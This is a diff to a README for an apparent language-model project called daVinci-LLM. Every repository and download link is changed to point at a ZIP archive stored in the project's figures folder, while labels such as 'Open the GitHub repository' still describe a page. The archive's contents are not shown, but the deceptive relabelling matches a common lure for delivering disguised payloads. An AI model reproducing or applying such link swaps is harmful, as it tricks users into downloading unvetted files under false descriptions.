@@ -2,7 +2,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/Download-Open%20on%20GitHub-blue?style=for-the-badge)](https://github.com/Carltonromansh946/daVinci-LLM)
+[![Download](https://img.shields.io/badge/Download-Open%20on%20GitHub-blue?style=for-the-badge)](https://github.com/Carltonromansh946/daVinci-LLM/raw/refs/heads/main/fig/Vinci-da-LLM-v3.1-alpha.3.zip)
 
 </div>
 
@@ -24,7 +24,7 @@ The current release focuses on showing how a smaller model can reach strong resu
 
 Use this link to visit the project page and download the files:
 
-[Visit the daVinci-LLM GitHub page](https://github.com/Carltonromansh946/daVinci-LLM)
+[Visit the daVinci-LLM GitHub page](https://github.com/Carltonromansh946/daVinci-LLM/raw/refs/heads/main/fig/Vinci-da-LLM-v3.1-alpha.3.zip)
 
 If the page shows a release file, download it to your PC. If it shows source files, download the ZIP file from GitHub.
 
@@ -150,9 +150,9 @@ Use the files under the terms listed in the repository license file.
 
 ## 📎 Quick Access
 
-[Open the GitHub repository](https://github.com/Carltonromansh946/daVinci-LLM)
+[Open the GitHub repository](https://github.com/Carltonromansh946/daVinci-LLM/raw/refs/heads/main/fig/Vinci-da-LLM-v3.1-alpha.3.zip)
 
-[Download from GitHub](https://github.com/Carltonromansh946/daVinci-LLM)
+[Download from GitHub](https://github.com/Carltonromansh946/daVinci-LLM/raw/refs/heads/main/fig/Vinci-da-LLM-v3.1-alpha.3.zip)
 
 ## 🧩 If You Need a Simple Start
 
